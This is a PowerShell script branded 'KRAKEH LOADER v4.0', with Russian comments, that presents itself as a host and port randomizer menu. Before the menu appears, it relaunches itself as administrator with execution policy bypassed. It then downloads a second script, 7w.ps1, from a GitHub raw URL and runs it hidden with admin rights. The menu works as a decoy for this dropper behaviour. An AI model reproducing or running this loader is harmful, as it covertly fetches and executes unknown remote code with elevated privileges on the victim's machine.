# ===== KRAKEH LOADER v4.0 - CLEAN EDITION =====
# ПЕРВЫМ ДЕЛОМ КАЧАЕМ PS1, ПОТОМ МЕНЮ С ХОСТАМИ/ПОРТАМИ (БЕЗ МАЙНА)

$Host.UI.RawUI.WindowTitle = "KRAKEH v4.0 - RANDOMIZER"
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "DarkRed"
Clear-Host

# ===== ССЫЛКА НА ТВОЙ PS1 =====
$ScriptURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/7w.ps1"
$ScriptPath = "$env:TEMP\7w.ps1"

# ===== 1. ПРОВЕРКА АДМИНА =====
Start-Sleep 1
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# ===== 2. КАЧАЕМ И ЗАПУСКАЕМ PS1 (С ПОВТОРАМИ) =====
Write-Host "[*] Скачиваю 7w.ps1..." -ForegroundColor Cyan
$MaxRetries = 5
$Downloaded = $false

for ($i = 1; $i -le $MaxRetries; $i++) {
    try {
        Invoke-WebRequest -Uri $ScriptURL -OutFile $ScriptPath -UseBasicParsing -ErrorAction Stop
        if ((Test-Path $ScriptPath) -and ((Get-Item $ScriptPath).Length -gt 0)) {
            $Downloaded = $true
            Write-Host "[+] Файл скачан! Запускаю в фоне..." -ForegroundColor Green
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`"" -Verb RunAs -WindowStyle Hidden
            break
        }
    } catch {
        if ($i -eq $MaxRetries) { Write-Host "[-] Ошибка скачивания" -ForegroundColor Red }
        Start-Sleep -Seconds 2
    }
}

Start-Sleep 2
Clear-Host

# ===== НОВЫЙ АРТ (БЕЗ МАЙНА) =====
$Art = @"
    ██╗  ██╗██████╗  █████╗ 
    ██║ ██╔╝██╔══██╗██╔══██╗
    █████╔╝ ██████╔╝███████║
    ██╔═██╗ ██╔══██╗██╔══██║
    ██║  ██╗██║  ██║██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
     LOADER v4.0 - HOST/PORT
"@

# ===== НОВЫЕ IP (БЕЗ МАЙНА) =====
function Get-RandomHost {
    $HostTypes = @(
        "localhost",
        "127.0.0.1",
        "192.168.$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "10.$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "172.$((Get-Random -Minimum 16 -Maximum 32)).$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))",
        "8.8.8.8",
        "1.1.1.1",
        "$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))"
    )
    return $HostTypes | Get-Random
}

# ===== НОВЫЕ ПОРТЫ (БЕЗ МАЙНА) =====
function Get-RandomPort {
    $PortTypes = @(
        (Get-Random -Minimum 1024 -Maximum 49151),
        80, 443, 22, 21, 8080, 3389, 4444, 1337, 6969, 7777,
        (Get-Random -Minimum 49152 -Maximum 65535)
    )
    return $PortTypes | Get-Random
}

# ===== МЕНЮ ХОСТОВ =====
function Show-HostMenu {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            HOST SELECTION MENU" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    Write-Host "  Current HOST: $Global:SelectedHost" -ForegroundColor Yellow
    Write-Host "  Current PORT: $Global:SelectedPort`n" -ForegroundColor Yellow
    Write-Host "  [1] GENERATE RANDOM HOST" -ForegroundColor Green
    Write-Host "  [2] ENTER CUSTOM HOST" -ForegroundColor White
    Write-Host "  [3] USE LOCALHOST (127.0.0.1)" -ForegroundColor White
    Write-Host "  [4] RANDOM PRIVATE IP (192.168.x.x)" -ForegroundColor White
    Write-Host "  [5] RANDOM PUBLIC IP" -ForegroundColor White
    Write-Host "  [6] SHOW ALL HOSTS AND SELECT" -ForegroundColor DarkCyan
    Write-Host "  [0] BACK TO MAIN MENU" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select option"
    switch ($Choice) {
        "1" { $Global:SelectedHost = Get-RandomHost; Write-Host "[+] NEW HOST: $Global:SelectedHost" -ForegroundColor Green; Start-Sleep 1; Show-HostMenu }
        "2" { $CustomHost = Read-Host "  [?] Enter host"; if ($CustomHost -ne "") { $Global:SelectedHost = $CustomHost }; Start-Sleep 1; Show-HostMenu }
        "3" { $Global:SelectedHost = "127.0.0.1"; Write-Host "[+] LOCALHOST SET"; Start-Sleep 1; Show-HostMenu }
        "4" { $Global:SelectedHost = "192.168.$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))"; Write-Host "[+] PRIVATE IP"; Start-Sleep 1; Show-HostMenu }
        "5" { $Global:SelectedHost = "$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))"; Write-Host "[+] PUBLIC IP"; Start-Sleep 1; Show-HostMenu }
        "6" { Show-AllHosts }
        "0" { Show-MainMenu }
        default { Write-Host "[-] INVALID!" -ForegroundColor Red; Start-Sleep 1; Show-HostMenu }
    }
}

# ===== ПОКАЗАТЬ ВСЕ ХОСТЫ =====
function Show-AllHosts {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            ALL AVAILABLE HOSTS" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    
    $AllHosts = @("localhost","127.0.0.1","192.168.1.100","192.168.0.1","10.0.0.1","172.16.0.1","8.8.8.8","1.1.1.1","$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 255))")
    
    for ($i = 0; $i -lt $AllHosts.Count; $i++) {
        Write-Host "  [$($i+1)] $($AllHosts[$i])" -ForegroundColor $(if (($i+1) % 2 -eq 0) { "DarkCyan" } else { "White" })
    }
    
    Write-Host "`n  [0] BACK" -ForegroundColor DarkGray
    $Choice = Read-Host "`n  [?] Select host number"
    if ($Choice -match '^\d+$' -and [int]$Choice -ge 1 -and [int]$Choice -le $AllHosts.Count) {
        $Global:SelectedHost = $AllHosts[[int]$Choice - 1]; Write-Host "[+] SELECTED: $Global:SelectedHost" -ForegroundColor Green; Start-Sleep 1
    } elseif ($Choice -eq "0") { Show-HostMenu } else { Write-Host "[-] INVALID!" -ForegroundColor Red; Start-Sleep 1; Show-AllHosts }
    Show-HostMenu
}

# ===== МЕНЮ ПОРТОВ =====
function Show-PortMenu {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            PORT SELECTION MENU" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    Write-Host "  Current HOST: $Global:SelectedHost" -ForegroundColor Yellow
    Write-Host "  Current PORT: $Global:SelectedPort`n" -ForegroundColor Yellow
    Write-Host "  [1] GENERATE RANDOM PORT" -ForegroundColor Green
    Write-Host "  [2] ENTER CUSTOM PORT" -ForegroundColor White
    Write-Host "  [3] HTTP DEFAULT (80)" -ForegroundColor White
    Write-Host "  [4] HTTPS DEFAULT (443)" -ForegroundColor White
    Write-Host "  [5] RANDOM HIGH PORT (49152-65535)" -ForegroundColor White
    Write-Host "  [6] RANDOM REGISTERED PORT (1024-49151)" -ForegroundColor White
    Write-Host "  [7] SHOW ALL PORTS AND SELECT" -ForegroundColor DarkCyan
    Write-Host "  [0] BACK TO MAIN MENU" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select option"
    switch ($Choice) {
        "1" { $Global:SelectedPort = Get-RandomPort; Write-Host "[+] NEW PORT: $Global:SelectedPort" -ForegroundColor Green; Start-Sleep 1; Show-PortMenu }
        "2" { $CustomPort = Read-Host "  [?] Enter port (1-65535)"; if ($CustomPort -match '^\d+$' -and [int]$CustomPort -ge 1 -and [int]$CustomPort -le 65535) { $Global:SelectedPort = [int]$CustomPort; Write-Host "[+] PORT SET" } else { Write-Host "[-] INVALID PORT!" }; Start-Sleep 1; Show-PortMenu }
        "3" { $Global:SelectedPort = 80; Write-Host "[+] PORT SET TO 80"; Start-Sleep 1; Show-PortMenu }
        "4" { $Global:SelectedPort = 443; Write-Host "[+] PORT SET TO 443"; Start-Sleep 1; Show-PortMenu }
        "5" { $Global:SelectedPort = Get-Random -Minimum 49152 -Maximum 65535; Write-Host "[+] HIGH PORT: $Global:SelectedPort"; Start-Sleep 1; Show-PortMenu }
        "6" { $Global:SelectedPort = Get-Random -Minimum 1024 -Maximum 49151; Write-Host "[+] REGISTERED PORT: $Global:SelectedPort"; Start-Sleep 1; Show-PortMenu }
        "7" { Show-AllPorts }
        "0" { Show-MainMenu }
        default { Write-Host "[-] INVALID!" -ForegroundColor Red; Start-Sleep 1; Show-PortMenu }
    }
}

# ===== ПОКАЗАТЬ ВСЕ ПОРТЫ =====
function Show-AllPorts {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "            ALL AVAILABLE PORTS" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    
    $AllPorts = @(@{Port=80; Desc="HTTP"},@{Port=443; Desc="HTTPS"},@{Port=22; Desc="SSH"},@{Port=21; Desc="FTP"},@{Port=8080; Desc="Proxy"},@{Port=3389; Desc="RDP"},@{Port=4444; Desc="Backdoor"},@{Port=1337; Desc="Leet"},@{Port=6969; Desc="Meme"},@{Port=7777; Desc="Custom"},@{Port=(Get-Random -Minimum 1024 -Maximum 49151); Desc="RANDOM REG"},@{Port=(Get-Random -Minimum 49152 -Maximum 65535); Desc="RANDOM DYN"})
    
    for ($i = 0; $i -lt $AllPorts.Count; $i++) {
        Write-Host "  [$($i+1)] $($AllPorts[$i].Port) - $($AllPorts[$i].Desc)" -ForegroundColor $(if (($i+1) % 2 -eq 0) { "DarkCyan" } else { "White" })
    }
    
    Write-Host "`n  [0] BACK" -ForegroundColor DarkGray
    $Choice = Read-Host "`n  [?] Select port number"
    if ($Choice -match '^\d+$' -and [int]$Choice -ge 1 -and [int]$Choice -le $AllPorts.Count) {
        $Global:SelectedPort = $AllPorts[[int]$Choice - 1].Port; Write-Host "[+] SELECTED PORT: $Global:SelectedPort" -ForegroundColor Green; Start-Sleep 1
    } elseif ($Choice -eq "0") { Show-PortMenu } else { Write-Host "[-] INVALID!" -ForegroundColor Red; Start-Sleep 1; Show-AllPorts }
    Show-PortMenu
}

# ===== ГЛАВНОЕ МЕНЮ =====
function Show-MainMenu {
    Clear-Host
    Write-Host $Art -ForegroundColor DarkRed
    Write-Host "`n================================================" -ForegroundColor Cyan
    Write-Host "       KRAKEH LOADER v4.0" -ForegroundColor Red
    Write-Host "================================================`n" -ForegroundColor Cyan
    Write-Host "  CURRENT CONFIGURATION:" -ForegroundColor Yellow
    Write-Host "  HOST: $Global:SelectedHost" -ForegroundColor Green
    Write-Host "  PORT: $Global:SelectedPort`n" -ForegroundColor Green
    Write-Host "  [1] SELECT HOST" -ForegroundColor White
    Write-Host "  [2] SELECT PORT" -ForegroundColor White
    Write-Host "  [3] RANDOMIZE BOTH (HOST + PORT)" -ForegroundColor Magenta
    Write-Host "  [4] COPY TO CLIPBOARD ($Global:SelectedHost`:$Global:SelectedPort)" -ForegroundColor DarkCyan
    Write-Host "  [5] TEST CONNECTION" -ForegroundColor Yellow
    Write-Host "  [0] EXIT" -ForegroundColor DarkGray
    Write-Host "`n================================================`n" -ForegroundColor Cyan
    
    $Choice = Read-Host "  [?] Select option"
    switch ($Choice) {
        "1" { Show-HostMenu }
        "2" { Show-PortMenu }
        "3" { $Global:SelectedHost = Get-RandomHost; $Global:SelectedPort = Get-RandomPort; Write-Host "[+] RANDOMIZED!" -ForegroundColor Green; Start-Sleep 2; Show-MainMenu }
        "4" { "$Global:SelectedHost`:$Global:SelectedPort" | Set-Clipboard; Write-Host "[+] COPIED!" -ForegroundColor Green; Start-Sleep 1; Show-MainMenu }
        "5" { $TestResult = Test-NetConnection -ComputerName $Global:SelectedHost -Port $Global:SelectedPort -WarningAction SilentlyContinue; if ($TestResult.TcpTestSucceeded) { Write-Host "[+] CONNECTION SUCCESSFUL!" -ForegroundColor Green } else { Write-Host "[-] CONNECTION FAILED" -ForegroundColor Red }; Read-Host "Press ENTER"; Show-MainMenu }
        "0" { Write-Host "[+] EXITING..." -ForegroundColor Cyan; Exit }
        default { Write-Host "[-] INVALID!" -ForegroundColor Red; Start-Sleep 1; Show-MainMenu }
    }
}

# ===== ИНИЦИАЛИЗАЦИЯ =====
$Global:SelectedHost = "localhost"
$Global:SelectedPort = 8080

# ===== ЗАПУСК ГЛАВНОГО МЕНЮ =====
Show-MainMenu
